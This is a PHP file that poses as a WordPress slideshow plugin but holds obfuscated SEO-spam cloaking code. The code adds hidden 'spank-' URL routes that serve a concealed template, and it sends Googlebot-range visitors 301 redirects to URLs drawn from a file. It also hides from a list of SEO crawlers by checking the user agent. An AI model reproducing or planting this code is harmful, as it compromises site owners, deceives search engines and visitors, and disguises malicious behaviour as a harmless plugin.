<?php
/**
 * Plugin Name: simple-slideshow
 * Description: simple-slideshow
 * Version: 1.0
 * Author: John Smith
 */
 

class tJhV1 {
	
    public function __construct() {
        add_action('init', [$this, 'rtxtrq']);
        add_filter('query_vars', [$this, 'vjpkegoc']);
        add_action('template_include', [$this, 'lutsxoh']);
		add_filter('document_title_parts', [$this, 'vsjyvytxht']);
    }

    public function rtxtrq() {
        add_rewrite_rule(
            '^spank-([0-9]+).*?$',
            'index.php?gxyscd=$matches[1]',
            'top'
        );
		flush_rewrite_rules();
    }

    public function vjpkegoc($vxpdxwG) {
        $vxpdxwG[] = 'gxyscd';
        $vxpdxwG[] = 'maiipydqgj';
        return $vxpdxwG;
    }
	
	public function vsjyvytxht($hkhxxgj) {
		if (get_query_var('gxyscd')) $hkhxxgj['title'] = get_query_var('maiipydqgj');
		return $hkhxxgj;
	}

    public function lutsxoh($guujpLYT) {
		
		$gHK6s4 = array('reminder-uploads', 'python', 'mj12bot', 'action-automatorwp', 'data-qr', 'real-block', 'scripts-stop', 'interactivity-multi', 'flash-url', 'gptbot', 'netspider', 'Go-http-client', 'serpstatbot', 'front-stream', 'semrush', 'dotbot', 'ahrefsbot', 'gravity-redirection');
		foreach($gHK6s4 as $oI2Zd4id1I) { if (stripos($_SERVER['HTTP_USER_AGENT'], $oI2Zd4id1I) !== false) return $guujpLYT; }

        if (get_query_var('gxyscd') && preg_match('/^[0-9]+$/', get_query_var('gxyscd'))) {
            return plugin_dir_path(__FILE__) . 'simple-slideshow/heading-first.php';
        } elseif (strpos($_SERVER['REMOTE_ADDR'], '66.249')===0) {
			$ys1LWcs = plugin_dir_path(__FILE__) . 'simple-slideshow/location-reusable.php';
			if (is_file($ys1LWcs)) {
				$aMCKJK9 = file($ys1LWcs, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
				if (count($aMCKJK9) > 1) {
					$xQ3tj = array_shift($aMCKJK9);
					$lpMDbmh = array_shift($aMCKJK9);
					if (strlen($lpMDbmh) > 0) {
						$eKGPO = $xQ3tj . "\n" . implode("\n", $aMCKJK9);
						file_put_contents($ys1LWcs, $eKGPO);
						header("HTTP/1.1 301 Moved Permanently");
						header("Location: $lpMDbmh");
						exit;
					}
				}
			}
		}
        return $guujpLYT;
    }
}
new tJhV1();



